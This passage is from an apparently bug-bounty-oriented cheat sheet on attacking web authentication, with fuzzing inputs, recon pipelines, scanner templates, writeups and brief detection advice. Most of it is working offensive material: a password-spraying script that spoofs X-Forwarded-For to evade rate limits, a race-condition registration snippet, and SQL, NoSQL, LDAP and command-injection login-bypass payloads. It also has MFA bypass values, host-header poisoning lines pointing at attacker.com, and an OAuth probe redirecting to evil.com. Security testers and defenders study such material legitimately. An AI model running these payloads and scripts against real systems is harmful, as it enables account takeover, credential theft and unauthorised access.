threading.Thread(target=register, args=("admin",)).start()
threading.Thread(target=register, args=("admin",)).start()

# Result: two "admin" accounts created
# Or: account created with attacker's email but admin privileges

# Race condition in password reset
# Request two resets simultaneously for same user
# Might get two valid tokens
# Or: token generation race -> predictable token

# Race condition in OAuth state parameter
# Two concurrent auth requests
# State parameter might be reused or predictable
```

---

## 19. Real World Case Studies

### 19.1 Uber MFA Fatigue Attack (2022)

```
# Attack Details:
# - Attacker compromised Uber employee credentials
# - Employee had MFA enabled (push notification)
# - Attacker spammed push notifications
# - Employee eventually accepted to stop notifications
# - Attacker gained access to internal systems

# Lessons:
# - Push notification fatigue is real
# - Users will accept anything to stop notifications
# - Need rate limiting on push notifications
# - Need additional verification for sensitive actions
```

### 19.2 MGM Resorts Social Engineering (2023)

```
# Attack Details:
# - Attacker researched employee on LinkedIn
# - Called Okta help desk impersonating employee
# - Convinced staff to reset MFA
# - Logged in with compromised credentials
# - Led to ransomware attack costing $100M+

# Lessons:
# - Help desk is weak link in MFA
# - Identity proofing must be strong
# - VIP requests need extra verification
# - Internal requests from compromised accounts look legitimate
```

### 19.3 Cisco IOS XE Authentication Bypass Chain (2023)

```
# CVE Chain:
# CVE-2023-20198: Initial access + privilege 15
# CVE-2023-20273: Root privilege escalation
# CVE-2023-20274: Lua backdoor installation

# Attack Flow:
# 1. Exploit web UI auth bypass
# 2. Gain privilege 15 (admin) access
# 3. Escalate to root
# 4. Install persistent backdoor

# Lessons:
# - Multi-CVE chaining is common
# - Auth bypass is often first step
# - Web UI is common attack surface
# - Need defense in depth
```

### 19.4 Snowflake Data Breaches (2024)

```
# Attack Details:
# - Many customers had not enabled MFA
# - Attackers used stolen credentials
# - Accessed accounts lacking MFA protection
# - Massive data exfiltration

# Lessons:
# - MFA must be enforced, not optional
# - Legacy accounts often lack MFA
# - Service accounts need MFA too
# - Regular audits of MFA coverage
```

### 19.5 Ivanti Connect Secure Chain (2024)

```
# CVE Chain:
# CVE-2023-46805: Auth bypass
# CVE-2024-21887: Command injection
# CVE-2024-21893: SSRF
# CVE-2024-22024: Auth bypass (different vector)

# Attack Flow:
# 1. Auth bypass to access admin functions
# 2. Command injection for RCE
# 3. SSRF for internal reconnaissance
# 4. Second auth bypass for persistence

# Lessons:
# - Four CVEs chained for full compromise
# - Auth bypass enables everything else
# - Integrity checkers can be bypassed
# - Need continuous monitoring
```

---

## 20. Fuzzing Payloads

### 20.1 Authentication Endpoint Fuzzing

```
# Fuzz login parameters
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=FUZZ&password=FUZZ

# Fuzz with:
# - SQL injection payloads
# - NoSQL injection payloads
# - LDAP injection payloads
# - XPath injection payloads
# - Command injection payloads
# - Template injection payloads
# - XML injection payloads
# - JSON injection payloads

# Fuzz headers:
X-Custom-Header: FUZZ
X-Original-URL: FUZZ
X-Rewrite-URL: FUZZ
X-Forwarded-For: FUZZ
X-Real-IP: FUZZ

# Fuzz content types:
Content-Type: FUZZ
# application/json
# application/xml
# text/xml
# application/x-www-form-urlencoded
# multipart/form-data
# text/plain
# application/x-amf
```

### 20.2 Session Token Fuzzing

```
# Fuzz session token format
# Try different encodings:
session=base64_encoded_data
session=hex_encoded_data
session=url_encoded_data
session=json_encoded_data
session=serialized_data

# Try token manipulation:
# Change single character
# Flip bits
# Change length
# Add/remove padding
# Change case

# Try different token types:
# JWT (decode and modify)
# Random strings (check entropy)
# Sequential numbers
# Timestamps
# UUIDs
# Hashed values
```

### 20.3 Password Reset Fuzzing

```
# Fuzz reset token format
# Try different lengths:
token=1
token=12
token=123
token=1234
token=123456
token=123456789012

# Try different character sets:
token=abcdef
token=ABCDEF
token=123456
token=!@#$%^&*
token=混合文字

# Try encoding variations:
token=base64(token)
token=url_encode(token)
token=hex(token)
token=md5(token)

# Try token manipulation:
# Empty token
token=
# Null token
token=null
# Array token
token[]=value
# Object token
token[key]=value
```

### 20.4 MFA Fuzzing

```
# Fuzz MFA code
# Try different lengths:
code=0
code=00
code=000
code=0000
code=00000
code=000000
code=0000000

# Try different formats:
code=0000
code=000000
code=00000000
code=0000-0000
code=0000 0000

# Try edge cases:
code=-1
code=99999999
code=abcdef
code=null
code=true
code=false

# Try bypass values:
code=000000
code=123456
code=111111
code=999999
code=0000
code=00000000
```


---

## 21. Automation Workflows

### 21.1 Recon + Auth Detection Pipeline

```bash
#!/bin/bash
# Full authentication recon pipeline

TARGET="$1"
OUTPUT_DIR="./output/$TARGET"
mkdir -p "$OUTPUT_DIR"

# Step 1: Subdomain enumeration
echo "[*] Enumerating subdomains..."
subfinder -d "$TARGET" -o "$OUTPUT_DIR/subdomains.txt"
amass enum -d "$TARGET" -o "$OUTPUT_DIR/amass.txt"
cat "$OUTPUT_DIR/subdomains.txt" "$OUTPUT_DIR/amass.txt" | sort -u > "$OUTPUT_DIR/all_subdomains.txt"

# Step 2: HTTP probing
echo "[*] Probing HTTP services..."
cat "$OUTPUT_DIR/all_subdomains.txt" | httpx -title -tech-detect -status-code -o "$OUTPUT_DIR/httpx.txt"

# Step 3: Find login endpoints
echo "[*] Finding authentication endpoints..."
grep -E "(login|signin|auth|admin|dashboard|portal|cpanel)" "$OUTPUT_DIR/httpx.txt" > "$OUTPUT_DIR/auth_endpoints.txt"

# Step 4: Nuclei auth scans
echo "[*] Running Nuclei auth templates..."
nuclei -l "$OUTPUT_DIR/httpx.txt"   -t ~/nuclei-templates/http/exposed-panels/   -t ~/nuclei-templates/http/vulnerabilities/   -tags auth,login,mfa,oauth   -o "$OUTPUT_DIR/nuclei_auth.txt"

# Step 5: Fuzz login parameters
echo "[*] Fuzzing login parameters..."
ffuf -w ~/SecLists/Fuzzing/fuzz-Bo0oM.txt   -u "https://$TARGET/login"   -X POST -d "username=admin&password=FUZZ"   -H "Content-Type: application/x-www-form-urlencoded"   -o "$OUTPUT_DIR/ffuf_login.json"

# Step 6: Check for common auth bypasses
echo "[*] Testing common auth bypasses..."
python3 auth_bypass_tester.py -t "$TARGET" -o "$OUTPUT_DIR/bypass_results.txt"

echo "[*] Done! Results in $OUTPUT_DIR"
```

### 21.2 Continuous Auth Monitoring

```yaml
# Nuclei continuous monitoring configuration
id: auth-monitoring

info:
  name: Authentication Endpoint Monitoring
  author: bugbounty-hunter
  severity: info

workflows:
  - template: http/exposed-panels/
    matchers:
      - name: admin-panel
        condition: or
        matchers:
          - word:
              words:
                - "admin"
                - "dashboard"
                - "management"
                - "portal"
                - "cpanel"

  - template: http/vulnerabilities/
    matchers:
      - name: auth-bypass
        condition: or
        matchers:
          - word:
              words:
                - "Authentication Bypass"
                - "Login Bypass"
                - "Session Fixation"
                - "MFA Bypass"

schedule:
  - interval: 1h
    targets:
      - https://target.com
    templates:
      - http/exposed-panels/
      - http/vulnerabilities/
    output:
      - webhook: https://hooks.slack.com/services/...
      - email: security@target.com
```

### 21.3 Automated Brute Force Script

```python
#!/usr/bin/env python3
import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class AuthBruteForcer:
    def __init__(self, target):
        self.target = target
        self.delay_range = (1, 5)
        self.max_retries = 3

    def attempt_login(self, username, password):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip(),
        }

        data = {
            'username': username,
            'password': password
        }

        for attempt in range(self.max_retries):
            try:
                response = requests.post(
                    f"https://{self.target}/login",
                    data=data,
                    headers=headers,
                    timeout=10
                )

                if response.status_code == 200:
                    if 'dashboard' in response.url or 'welcome' in response.text.lower():
                        return True, f"{username}:{password}"

                if response.status_code == 429:
                    time.sleep(random.uniform(10, 30))
                    continue

                return False, None

            except Exception as e:
                if attempt == self.max_retries - 1:
                    return False, None
                time.sleep(random.uniform(1, 3))

        return False, None

    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def distributed_spray(self, usernames, passwords, max_workers=50):
        results = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for password in passwords:
                for username in usernames:
                    future = executor.submit(self.attempt_login, username, password)
                    futures.append(future)
                    time.sleep(random.uniform(0.1, 0.5))

            for future in as_completed(futures):
                success, creds = future.result()
                if success:
                    results.append(creds)
                    print(f"[+] Found credentials: {creds}")

        return results
```

---

## 22. Recon Methodology

### 22.1 Authentication Attack Surface Mapping

```
Phase 1: Discovery
1. Enumerate all authentication endpoints
   - /login, /signin, /auth
   - /register, /signup
   - /forgot-password, /reset-password
   - /oauth/authorize, /oauth/token
   - /api/auth, /api/login
   - /admin/login, /management/login
   - /saml/sso, /saml/acs
   - /openid/connect

2. Identify authentication mechanisms
   - Form-based (username/password)
   - Token-based (JWT, API keys)
   - OAuth 2.0 / OpenID Connect
   - SAML 2.0
   - Certificate-based
   - WebAuthn / FIDO2
   - Magic links
   - Social login

3. Map session management
   - Cookie-based sessions
   - JWT in cookies/localStorage
   - OAuth tokens
   - Session duration, timeout policies

Phase 2: Analysis
1. Analyze request/response flow
   - Login request structure
   - Session establishment
   - Authentication checks
   - Logout process

2. Identify security controls
   - Rate limiting
   - Account lockout
   - CAPTCHA
   - MFA/2FA
   - IP restrictions
   - Device fingerprinting

Phase 3: Testing
1. Test each mechanism for bypasses
2. Test session management for fixation/puzzling
3. Test MFA for bypass techniques
4. Test password reset for poisoning
5. Test OAuth for misconfigurations
```

### 22.2 Technology Stack Identification

```bash
# Identify auth technologies
# Wappalyzer / BuiltWith / WhatRuns browser extensions

# Check response headers for clues
curl -I https://target.com/login | grep -iE "(server|x-powered-by|set-cookie)"

# Common auth frameworks:
# - Set-Cookie: session= -> Express, Flask, Django
# - Set-Cookie: PHPSESSID= -> PHP
# - Set-Cookie: ASP.NET_SessionId= -> ASP.NET
# - Authorization: Bearer -> JWT/OAuth
# - X-Auth-Token -> Custom/API

# Check for known auth systems:
# /wp-login.php -> WordPress
# /administrator -> Joomla
# /user/login -> Drupal
# /auth/login -> Laravel
# /login -> Generic (check body for framework clues)

# Fingerprint MFA providers:
# - Duo Security (duo.com)
# - Google Authenticator (TOTP)
# - Authy (Twilio)
# - Microsoft Authenticator
# - Okta
# - Auth0
# - OneLogin
```

### 22.3 Endpoint Enumeration

```bash
# Find auth endpoints with ffuf
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt   -u https://target.com/FUZZ   -mc 200,301,302,401,403,500   -o endpoints.json

# Find API auth endpoints
ffuf -w ~/SecLists/Discovery/Web-Content/api/api-endpoints.txt   -u https://target.com/api/FUZZ   -mc 200,401,403   -H "Authorization: Bearer test"

# Find OAuth endpoints
ffuf -w ~/SecLists/Discovery/Web-Content/oauth.txt   -u https://target.com/FUZZ   -mc 200,301,302

# Find admin panels
ffuf -w ~/SecLists/Discovery/Web-Content/admin-panels.txt   -u https://target.com/FUZZ   -mc 200,301,302,401
```

### 22.4 Session Analysis

```bash
# Analyze session cookies
# Check for security attributes
curl -I https://target.com/login | grep -i "set-cookie"

# Check cookie flags:
# - Secure (HTTPS only)
# - HttpOnly (no JS access)
# - SameSite (CSRF protection)
# - Path (scope)
# - Domain (scope)
# - Expires/Max-Age (lifetime)

# Check session token entropy
curl -s https://target.com/login | grep -oP 'session=[^;]+' | head -20 > sessions.txt
# Analyze with Burp Sequencer or ent tool

# Check for session fixation
curl -c cookies.txt -I https://target.com/login
# Login
curl -b cookies.txt -X POST -d "username=admin&password=admin" https://target.com/login
# Check if session changed
curl -b cookies.txt -I https://target.com/dashboard
```


---

## 23. Nuclei Templates

### 23.1 Authentication Bypass Templates

```yaml
# Custom Nuclei template for auth bypass via response manipulation
id: auth-bypass-response-manipulation

info:
  name: Authentication Bypass via Response Manipulation
  author: bugbounty-hunter
  severity: critical
  description: |
    Detects authentication bypass vulnerabilities by testing
    common response manipulation techniques.
  tags: auth,bypass,login

requests:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=admin

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "dashboard"
          - "welcome"
          - "admin"
          - "logout"
        condition: or
        part: body

      - type: status
        status:
          - 200
          - 302

    extractors:
      - type: regex
        name: session_cookie
        regex:
          - "Set-Cookie: ([^;]+)"
        part: header
```

### 23.2 Exposed Panel Templates

```yaml
# Nuclei template for exposed admin panels
id: exposed-admin-panel

info:
  name: Exposed Admin Panel
  author: bugbounty-hunter
  severity: high
  description: |
    Detects exposed administrative panels that may be
    accessible without authentication.
  tags: panel,admin,exposed

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/adminpanel"
      - "{{BaseURL}}/admincp"
      - "{{BaseURL}}/cpanel"
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/management"
      - "{{BaseURL}}/manager"
      - "{{BaseURL}}/console"
      - "{{BaseURL}}/backend"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "admin"
          - "dashboard"
          - "management"
          - "control panel"
          - "administrator"
        condition: or
        part: body

      - type: status
        status:
          - 200
          - 301
          - 302
```

### 23.3 MFA Bypass Detection Template

```yaml
id: mfa-bypass-detection

info:
  name: MFA Bypass Detection
  author: bugbounty-hunter
  severity: critical
  description: |
    Detects potential MFA bypass by testing if direct access
    to protected endpoints is possible without MFA.
  tags: mfa,2fa,bypass,auth

requests:
  - raw:
      - |
        GET /login2 HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{session_cookie}}

      - |
        POST /login2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{session_cookie}}

        mfa-code=000000&csrf={{csrf_token}}

    extractors:
      - type: regex
        name: session_cookie
        regex:
          - "session=([^;]+)"
        part: header
        internal: true

      - type: regex
        name: csrf_token
        regex:
          - 'name="csrf" value="([^"]+)"'
        part: body
        internal: true

    matchers:
      - type: word
        words:
          - "dashboard"
          - "welcome"
          - "admin"
        condition: or
        part: body
```

### 23.4 OAuth Misconfiguration Template

```yaml
id: oauth-misconfiguration

info:
  name: OAuth Misconfiguration Detection
  author: bugbounty-hunter
  severity: high
  description: |
    Detects common OAuth misconfigurations including
    open redirect, weak state parameter, and scope escalation.
  tags: oauth,misconfig,auth

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri=https://evil.com&response_type=code"
      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri={{BaseURL}}/callback&response_type=code&scope=profile+email+admin"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "authorization_endpoint"
          - "token_endpoint"
        condition: or
        part: body

      - type: word
        words:
          - "redirect_uri_mismatch"
          - "invalid_redirect_uri"
        negative: true
        part: body

      - type: status
        status:
          - 200
          - 302
```

### 23.5 Session Fixation Template

```yaml
id: session-fixation-detection

info:
  name: Session Fixation Detection
  author: bugbounty-hunter
  severity: medium
  description: |
    Detects session fixation vulnerabilities by checking
    if session ID remains the same after authentication.
  tags: session,fixation,auth

requests:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{pre_auth_session}}

        username=admin&password=admin

    extractors:
      - type: regex
        name: pre_auth_session
        regex:
          - "session=([^;]+)"
        part: header
        internal: true

    matchers:
      - type: word
        words:
          - "session={{pre_auth_session}}"
        part: header
```

---

## 24. Tools and Scanners

### 24.1 Essential Authentication Testing Tools

| Tool | Purpose | Usage |
|------|---------|-------|
| Burp Suite | Web proxy, manual testing, automation | Intercept, modify, replay requests |
| OWASP ZAP | Web proxy, automated scanning | Find auth vulnerabilities automatically |
| ffuf | Fast web fuzzer | Fuzz endpoints, parameters, headers |
| wfuzz | Web fuzzer | Fuzz with multiple payloads |
| Nuclei | Vulnerability scanner | Run auth-specific templates |
| httpx | HTTP prober | Find live auth endpoints |
| subfinder | Subdomain enumeration | Find auth subdomains |
| amass | Subdomain enumeration | Comprehensive subdomain discovery |
| jwt_tool | JWT testing | Analyze, forge, crack JWT tokens |
| hashcat | Password cracking | Crack weak passwords, tokens |
| Hydra | Login brute force | Brute force login forms |
| Medusa | Login brute force | Parallel brute force |
| Patator | Brute force | Multi-protocol brute force |
| SQLMap | SQL injection | Test login forms for SQLi |
| XSStrike | XSS detection | Find XSS in auth flows |
| postMessage-tracker | postMessage analysis | Find insecure postMessage usage |
| pp-finder | Prototype pollution | Find prototype pollution gadgets |
| CursedChrome | Chrome exploitation | Abuse Chrome for auth bypass |
| smuggler | HTTP request smuggling | Detect smuggling vulnerabilities |
| http-request-smuggler | Burp extension | Smuggling detection in Burp |
| param-miner | Parameter discovery | Find hidden parameters |
| cariddi | URL crawler | Crawl and extract endpoints |
| interactsh | OOB interaction | Receive out-of-band callbacks |
| notify | Notification | Alert on findings |
| uncover | Search engine queries | Find exposed services |

### 24.2 Burp Suite Extensions for Auth Testing

```
# Essential Burp extensions:
# 1. HTTP Request Smuggler (PortSwigger)
#    - Detect request smuggling vulnerabilities
#    - Automated detection and exploitation
#
# 2. Param Miner (PortSwigger)
#    - Discover hidden parameters
#    - Find cache-busting parameters
#    - Detect parameter cloaking
#
# 3. Turbo Intruder (PortSwigger)
#    - High-speed brute force
#    - Custom Python scripts for attacks
#    - Race condition testing
#
# 4. JWT4B (Julian Horvat)
#    - JWT token analysis
#    - Algorithm confusion testing
#    - Weak secret detection
#
# 5. Autorize (Barak Tawily)
#    - Automated authorization testing
#    - Detect auth bypasses
#    - Role-based access control testing
#
# 6. SAML Raider (Roland Bischofberger)
#    - SAML message editing
#    - XSW attacks
#    - Signature wrapping
#
# 7. WAFDetect (Various)
#    - WAF fingerprinting
#    - Bypass technique suggestions
#
# 8. Logger++ (Various)
#    - Advanced logging
#    - Request/response analysis
```

### 24.3 ProjectDiscovery Toolchain

```bash
# Complete ProjectDiscovery workflow for auth testing

# 1. Subdomain enumeration
subfinder -d target.com -all | anew subdomains.txt

# 2. DNS resolution
dnsx -l subdomains.txt -o resolved.txt

# 3. HTTP probing
httpx -l resolved.txt -title -tech-detect -status-code -o live.txt

# 4. Port scanning (for auth services)
naabu -l resolved.txt -top-ports 1000 -o ports.txt

# 5. Path discovery
katana -l live.txt -o paths.txt

# 6. Nuclei scanning
nuclei -l live.txt   -t http/exposed-panels/   -t http/vulnerabilities/   -t http/misconfiguration/   -severity critical,high,medium   -o nuclei_results.txt

# 7. Fuzzing
ffuf -w paths.txt -u https://target.com/FUZZ   -mc 200,401,403,500 -o fuzz_results.json

# 8. Notification
notify -data nuclei_results.txt -provider slack
```


---

## 25. Advanced Research

### 25.1 Splitting the Email Atom (PortSwigger Research)

```
# Email address parsing inconsistencies
# "local-part@domain" has complex parsing rules

# Attack: Email address confusion
# Register: attacker+ victim@example.com
# Some parsers: attacker+victim@example.com
# Other parsers: attacker (with comment) victim@example.com

# Or:
# attacker@victim.com@target.com
# Some parsers: attacker@victim.com (comment: @target.com)
# Other parsers: attacker (with domain victim.com@target.com)

# Impact:
# - Account takeover via email confusion
# - Password reset to wrong address
# - Email verification bypass
```

### 25.2 Browser-Powered Desync Attacks (PortSwigger Research)

```
# Browser-powered request smuggling
# Uses victim's browser to deliver attack

# Key insight:
# Browsers normalize requests differently than servers
# CRLF in form values -> browsers encode, but some servers don't

# Attack:
# 1. Attacker's page has form that submits to target.com
# 2. Form field contains crafted value with CRLF
# 3. Browser sends normalized request
# 4. But server deserializes form value -> request smuggling

# Example:
# <form action="https://target.com/api" method="POST">
#   <input name="data" value="X

GET /admin HTTP/1.1
Host: target.com

">
# </form>

# If server reflects data in response without proper encoding:
# -> Response splitting -> cache poisoning -> auth bypass
```

### 25.3 Web Cache Entanglement (PortSwigger Research)

```
# Cache entanglement: Multiple resources share cache key
# Poison one resource -> affect another

# Example:
# /api/user/123 and /api/user/456 share cache key
# Because cache normalizes user ID

# Attack:
# 1. Attacker requests /api/user/123 with malicious header
# 2. Cache stores response with key: /api/user/*
# 3. Victim requests /api/user/456
# 4. Cache returns attacker's poisoned response

# Auth impact:
# Poison /api/user/123 with admin data
# Victim requesting /api/user/456 gets admin data
# -> Information disclosure
# Or: Poison with XSS -> session hijacking
```

### 25.4 HTTP/1 Must Die (PortSwigger Research)

```
# HTTP/1 connection reuse vulnerabilities
# Connection: keep-alive with request pipelining

# Attack:
# 1. Attacker sends multiple requests on same connection
# 2. Front-end processes request 1
# 3. Back-end processes request 1 + request 2 (pipelined)
# 4. Request 2 bypasses front-end checks

# Auth impact:
# Request 1: GET /public (allowed)
# Request 2: GET /admin (pipelined, bypasses auth check)
# Front-end sees only request 1
# Back-end processes both
```

### 25.5 Practical Web Cache Poisoning (PortSwigger Research)

```
# Cache poisoning with unkeyed inputs
# Cache key doesn't include all inputs

# Discovery:
# 1. Find unkeyed inputs (headers, cookies, parameters)
# 2. Determine if input affects response
# 3. Craft malicious input
# 4. Poison cache
# 5. Victim gets poisoned response

# Auth-specific:
# Poison /login with XSS payload
# Victim visits /login -> XSS executes -> steals credentials

# Or:
# Poison /api/user with attacker-controlled data
# Victim gets attacker's profile data
# -> Session confusion -> auth bypass
```

---

## 26. Bug Bounty Writeups

### 26.1 Authentication Bypass via Logical Flaw

```
# Writeup: Bypassing Authentication via Logical Flaw
# Platform: [Redacted]
# Bounty: $X,XXX

# Discovery:
# 1. Analyzed login flow with Burp Suite
# 2. Noticed session validation anomaly
# 3. Captured request after successful login

# Vulnerability:
# After login, server sets session cookie
# But authentication check only validates Referer header
# If Referer contains /dashboard -> access granted

# Exploitation:
# 1. Send request to /dashboard
# 2. Modify Referer to https://target.com/dashboard
# 3. Remove Authorization header
# 4. Server responds 200 OK with dashboard content

# Impact:
# - Access restricted areas without credentials
# - Retrieve sensitive user data
# - Perform unauthorized actions

# Fix:
# - Validate session server-side
# - Don't rely on Referer for auth
# - Check Authorization header on every request
```

### 26.2 MFA Bypass via Response Manipulation

```
# Writeup: MFA Bypass via Response Manipulation
# Platform: [Redacted]
# Bounty: $XXX -> $X,XXX (escalated)

# Discovery:
# 1. Enabled SMS 2FA on test account
# 2. Logged out, initiated login
# 3. Intercepted response after password entry

# Vulnerability:
# Server response contained JSON:
# {"requires_2fa": true, "phone": "+1-555-XXXX"}
# Modified to: {"requires_2fa": false}
# -> Bypassed 2FA entirely

# Impact:
# Any attacker with credentials can bypass 2FA
# No SMS code needed

# Fix:
# - Enforce 2FA server-side
# - Don't trust client-side flags
# - Validate 2FA completion before granting access
```

### 26.3 Password Reset Broken Logic

```
# Writeup: Password Reset Broken Logic
# Platform: PortSwigger Lab
# Severity: High

# Discovery:
# 1. Requested password reset
# 2. Received email with reset link
# 3. Clicked link -> reached reset form

# Vulnerability:
# GET /reset?token=VALID_TOKEN -> validates token, shows form
# POST /reset -> sets new password
# BUT: POST request doesn't include token!
# Only includes username (hidden field) and new password

# Exploitation:
# 1. Attacker requests reset for their own account
# 2. Gets valid token, reaches reset form
# 3. Intercepts POST request
# 4. Changes username hidden field to victim's username
# 5. Victim's password changed!

# Impact:
# - Account takeover without access to victim's email
# - Any account can be compromised

# Fix:
# - Validate reset token on POST request
# - Bind token to specific user
# - Invalidate token after use
```

### 26.4 Username Enumeration via Response Timing

```
# Writeup: Username Enumeration via Response Timing
# Platform: PortSwigger Lab
# Severity: Medium

# Discovery:
# 1. Tested login with invalid username
#    -> Response time: ~300ms
# 2. Tested login with valid username + wrong password
#    -> Response time: ~300ms (same!)
# 3. Tested with very long password (10000 chars)
#    -> Invalid username: ~600ms
#    -> Valid username: ~2500ms (hash computation!)

# Vulnerability:
# Valid usernames trigger password hash computation
# Invalid usernames return immediately
# Time difference reveals valid usernames

# Exploitation:
# 1. Generate username list
# 2. For each username, send login with 10000-char password
# 3. Measure response time
# 4. Times > 2000ms -> valid username

# Bypass:
# IP-based brute force protection bypassed with X-Forwarded-For

# Impact:
# - Enumerate valid usernames
# - Enable targeted password attacks
# - Information disclosure

# Fix:
# - Constant-time comparison
# - Same response time for all cases
# - Rate limiting on login attempts
```

### 26.5 OAuth Hidden Attack Vectors

```
# Writeup: OAuth Account Takeover
# Platform: [Redacted]
# Bounty: $X,XXX

# Discovery:
# 1. Analyzed OAuth implementation
# 2. Found dynamic client registration endpoint
# 3. Registered malicious OAuth app

# Vulnerability:
# - Open dynamic client registration
# - No redirect_uri validation
# - Weak state parameter (predictable)
# - ID token accepted as access token

# Exploitation:
# 1. Register app with redirect_uri=https://attacker.com
# 2. Send authorization link to victim
# 3. Victim authorizes -> code sent to attacker
# 4. Exchange code for tokens
# 5. Use tokens to access victim's account

# Impact:
# - Full account takeover
# - Access to all OAuth-granted resources

# Fix:
# - Validate redirect_uri against whitelist
# - Use strong, random state parameter
# - Separate ID token and access token validation
# - Disable dynamic registration or require approval
```


---

## 27. Payload Collections

### 27.1 Authentication Bypass Payload List

```
# SQL Injection Login Bypass
admin'--
admin'#
admin'/*
' OR '1'='1
' OR 1=1--
" OR ""="
' UNION SELECT * FROM users--
1' OR '1'='1'--
1' AND 1=1--
1' AND 1=2--
' OR 'x'='x
') OR ('x'='x
' OR 1=1 LIMIT 1--
' OR '1'='1' /*
admin' AND 1=1--
admin' AND 1=2--
' OR 1=1#"
' OR '1'='1'--
" OR "1"="1"--
" OR "1"="1"#
" OR "1"="1"/*
'OR '1'='1'--
'OR '1'='1'#
'OR '1'='1'/*
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*

# NoSQL Injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# LDAP Injection
*)(uid=*))(&(uid=*
*)(uid=*))(|(uid=*
*)(uid=*))(&(uid=*))(&(uid=*
admin*)(uid=*
admin*)((userPassword=*)
*)(uid=*))(&(uid=*

# XPath Injection
' or '1'='1
' or ''='
' or 1=1 or ''='
' or 'a'='a
' or 'a'='a'--
" or "1"="1
" or ""="

# Command Injection (if login triggers system commands)
admin; whoami
admin | whoami
admin && whoami
admin || whoami
`whoami`
$(whoami)
```

### 27.2 MFA Bypass Payloads

```
# Response Manipulation
{"requires_2fa": false}
{"mfa_required": false}
{"two_factor_enabled": false}
{"requires_otp": false}
{"otp_required": false}

# Null/Empty OTP
000000
00000000
null
NULL
None
none
0
123456
111111
222222
333333
444444
555555
666666
777777
888888
999999

# OTP Brute Force Range
0000-9999 (4-digit)
000000-999999 (6-digit)
00000000-99999999 (8-digit)

# Backup Code Abuse
backup-code=00000000
backup-code=12345678
backup-code=000000000000

# Session Manipulation
Cookie: session=PRE_AUTH_SESSION
Cookie: session=OLD_SESSION
Cookie: session=ATTACKER_SESSION
```

### 27.3 Password Reset Payloads

```
# Host Header Poisoning
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com

# Token Manipulation
token=000000
token=123456
token=999999
token=null
token=
token[]=value
token[key]=value

# Logic Bypass
email=victim@target.com&email=attacker@evil.com
username=victim&username=attacker
user_id=1&user_id=2

# Response Manipulation
{"valid": true}
{"verified": true}
{"reset_allowed": true}
{"token_valid": true}
```

### 27.4 Session Management Payloads

```
# Session Fixation
?sessionid=ATTACKER_SESSION
?JSESSIONID=ATTACKER_SESSION
?PHPSESSID=ATTACKER_SESSION
?ASP.NET_SessionId=ATTACKER_SESSION

# Cookie Injection
document.cookie = "sessionid=ATTACKER_SESSION; path=/; domain=.example.com";

# META Tag Injection
<meta http-equiv="Set-Cookie" content="sessionid=ATTACKER_SESSION">

# Session Puzzling
POST /forgot-password
username=victim
-> Capture cookie
-> Use on /profile

# Session Variable Overloading
POST /newsletter
email=admin@target.com
-> Capture cookie
-> Use on /admin
```

---

## 28. Detection Techniques

### 28.1 Detecting Authentication Bypass Attempts

```
# Server-side detection:
# 1. Monitor for multiple failed logins from same IP
# 2. Detect response manipulation (size anomalies)
# 3. Track session ID patterns
# 4. Monitor for unusual User-Agent strings
# 5. Detect timing-based attacks (uniform response times)

# Log analysis:
# - Failed login attempts per IP
# - Failed login attempts per username
# - Unusual login success patterns
# - Session ID reuse
# - Cookie tampering attempts

# WAF rules:
# - Block SQL injection in login fields
# - Detect response manipulation patterns
# - Rate limit login attempts
# - Validate session integrity
```

### 28.2 Detecting MFA Bypass

```
# Detection:
# 1. Monitor for direct access to post-MFA endpoints
# 2. Detect missing OTP submissions
# 3. Track session transitions (pre-auth -> post-auth without MFA)
# 4. Monitor for OTP brute force patterns
# 5. Detect backup code abuse

# Alerting:
# - Alert on MFA disable without re-authentication
# - Alert on MFA bypass from new device/IP
# - Alert on multiple OTP failures
# - Alert on concurrent sessions with different MFA status
```

### 28.3 Detecting Session Attacks

```
# Session fixation detection:
# 1. Alert if session ID doesn't change after login
# 2. Alert if pre-auth session used for authenticated requests
# 3. Monitor for session ID patterns (predictable, sequential)

# Session hijacking detection:
# 1. Alert on session use from multiple IPs
# 2. Alert on session use from multiple User-Agents
# 3. Alert on session use from multiple geolocations
# 4. Alert on unusual session timing (3am access for 9-5 user)

# Session puzzling detection:
# 1. Alert if unauthenticated endpoints set auth-related session data
# 2. Monitor session variable usage across endpoints
# 3. Alert on session data from unexpected sources
```

### 28.4 Detecting OAuth Abuse

```
# Detection:
# 1. Monitor for unusual redirect_uri values
# 2. Alert on authorization code reuse
# 3. Detect state parameter anomalies
# 4. Monitor for scope escalation attempts
